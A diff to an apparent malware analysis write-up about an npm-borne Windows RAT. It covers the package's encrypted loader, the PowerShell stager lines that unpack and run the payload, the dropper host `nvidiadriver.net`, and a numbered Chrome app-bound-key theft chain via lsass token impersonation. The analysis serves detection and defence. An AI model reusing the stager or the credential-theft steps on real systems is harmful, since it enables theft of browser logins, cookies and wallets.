@@ -14,7 +14,22 @@ pkg.<span class="tok-fn">run</span>();
 module.exports = pkg;
 </code></pre>
 
-`run` is `runDefaultDecodedFunction` from `src/pipeline/custom-codec-pipeline.js`. It pulls a 6 KB AES-GCM ciphertext (`DEFAULT_FINAL_ENCODED_TEXT`) and a hardcoded passphrase (`default-dev-passphrase`, salt `encode-npm-c-salt`) out of `src/config/defaults.js`, scrypt-derives a key, and runs `aes-256-gcm` → `encode-decode-codec` → `position-unit-codec` in reverse. The decoded string is handed to `new Function("require", runnable)(require)` — `eval` with one indirection, so the static reader's eye slides off it.
+`run` is `runDefaultDecodedFunction` from `src/pipeline/custom-codec-pipeline.js`. It pulls a 6 KB AES-GCM ciphertext and key material out of `src/config/defaults.js`:
+
+| Variable | Value |
+| --- | --- |
+| Ciphertext | `DEFAULT_FINAL_ENCODED_TEXT` (6 KB) |
+| Passphrase | `default-dev-passphrase` |
+| Salt | `encode-npm-c-salt` |
+| KDF | scrypt |
+
+The decoded plaintext comes out of three reversed codec layers:
+
+1. `aes-256-gcm`
+2. `encode-decode-codec`
+3. `position-unit-codec`
+
+The result is handed to `new Function("require", runnable)(require)` — `eval` with one indirection, so the static reader's eye slides off it.
 
 The decrypted JS is a self-deleting PowerShell stager:
 
@@ -33,7 +48,13 @@ Expand-Archive -Force -Path "$env:TEMP\winPatch.zip" -DestinationPath "$env:TEMP
 wscript "$env:TEMP\winPatch\update.vbs"
 </code></pre>
 
-`nvidiadriver.net` (Hetzner `95.216.92.207`) serves the payload as a 6 MB store-compressed zip behind an Express front-end with full helmet, CSP, and HSTS headers — the kind of dropper infrastructure you stand up once and reuse. The response advertises `Content-Disposition: attachment; filename="win-driver-bd9e.zip"`, and the archive carries a complete CPython 3.10 runtime alongside three Nuitka-compiled `.pyd` modules. `chost.exe` is unmodified `python.exe` renamed (PDB path `D:\_w\1\b\bin\amd64\python.pdb`, imports `Py_Main` from `python310.dll`, PSF cert string intact); the modules are confirmed Nuitka by `__nuitka_version__`, `__compiled__`, and `PyMarshal_ReadObjectFromString`.
+`nvidiadriver.net` (Hetzner `95.216.92.207`) serves the payload as a 6 MB store-compressed zip behind an Express front-end with full helmet, CSP, and HSTS headers — the kind of dropper infrastructure you stand up once and reuse. The response advertises `Content-Disposition: attachment; filename="win-driver-bd9e.zip"`. Inside is a complete CPython 3.10 runtime alongside three Nuitka-compiled `.pyd` modules:
+
+- `chost.exe` — `python.exe` unmodified, PDB `D:\_w\1\b\bin\amd64\python.pdb`, PSF cert intact
+- Three `.pyd` modules — confirmed Nuitka by their constants:
+  - `__nuitka_version__`
+  - `__compiled__`
+  - `PyMarshal_ReadObjectFromString`
 
 Nuitka's compressed constants hide the C2 URL itself, but `cleave analyze` on the three modules fires twelve `well-known/malware/rat/winpatch::*` rules at once — campaign tag, transport, six command verbs, the Chrome-cookie task, the dump-file banner and filename, and two typo-fingerprint rules unique to the family. The Unicode constant table in `.rdata` shows why each one matched:
 
@@ -58,9 +79,21 @@ Nuitka's compressed constants hide the C2 URL itself, but `cleave analyze` on th
 | `requests.post`, `Content-Type: application/octet-stream` | HTTP carrier |
 | `urandom`, `KEY_LENGTH` | per-session ARC4 key |
 
-Cleave also flags `external-ipv4-port-rdata-pair` matches (`11.1.82.27:2164`, `13.53.31.116:6445`) in this `.rdata`, but the literal IP+port byte sequences aren't present — they're heuristic detections misfiring against Nuitka's relocation tables and shouldn't be treated as C2 endpoints.
+**`auto.cp310-win_amd64.pyd` — the Chrome ABE stealer.** This is the part most npm-dropped Windows stealers skip: Chrome's app-bound encryption binds the v20 key to a SYSTEM-only DPAPI scope, and `auto.pyd` pays the cost of getting there. The escalation chain:
 
-**`auto.cp310-win_amd64.pyd` — the Chrome ABE stealer.** This is the part most npm-dropped Windows stealers skip: Chrome's app-bound encryption binds the v20 key to a SYSTEM-only DPAPI scope, and `auto.pyd` pays the cost of getting there. It enables `SeDebugPrivilege`, opens `lsass.exe`, duplicates the primary token, and runs the next CNG call under that impersonation — long enough for `NCryptOpenKey("Google Chromekey1")` to unwrap `app_bound_encrypted_key` from `Local State`. Cleave's `winpatch::winpatch-chrome-stealer` rule matches on five module-unique strings together, and `credential-access/browser/chromium::chromium-app-bound-key-theft-binary` confirms the full chain. The recovered key decrypts `Login Data`, cookies, and `Local Extension Settings` (where browser-wallet extensions live); results are bannered `Chrome Saved Logins Dump`, written to `chrome_logins_dump.txt`, and uploaded by `audiodriver` over `htxp`.
+1. Enable `SeDebugPrivilege`
+2. Open `lsass.exe`
+3. Duplicate its primary token
+4. Call `NCryptOpenKey("Google Chromekey1")` under that impersonation
+5. Use the returned key to unwrap `app_bound_encrypted_key` from `Local State`
+
+Two cleave rules confirm the full chain: `winpatch::winpatch-chrome-stealer` matches on five module-unique strings together, and `credential-access/browser/chromium::chromium-app-bound-key-theft-binary` matches the ABE primitives. The recovered key decrypts three browser stores:
+
+- `Login Data` (saved-logins SQLite)
+- the cookie database
+- `Local Extension Settings` (where browser-wallet extensions live)
+
+Results are bannered `Chrome Saved Logins Dump` and written to `chrome_logins_dump.txt`. `audiodriver` uploads them over `htxp`.
 
 | Constant | Role |
 | --- | --- |
